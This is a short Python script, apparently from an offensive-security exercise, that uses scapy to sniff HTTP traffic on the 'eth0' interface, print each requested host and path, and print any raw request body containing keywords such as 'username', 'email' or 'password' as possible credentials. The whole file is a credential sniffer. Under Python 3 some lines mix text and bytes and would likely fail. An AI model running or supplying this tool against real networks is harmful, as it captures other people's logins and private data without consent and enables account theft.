import scapy.all as scapy
import argparse
from scapy.sendrecv import sniff
from scapy.layers import http
iface= "eth0"
def sniff(iface):
    scapy.sniff(iface=iface, store=False, prn=process_packet)

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print(str("[+] Http Request >> " + packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path))
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keys = ["username","uname","email", "pass", "password", "pass", "email"]
            for key in keys:
                if key in load:
                    print("[+] Possible password/username >> " + load)
                    break


sniff(iface)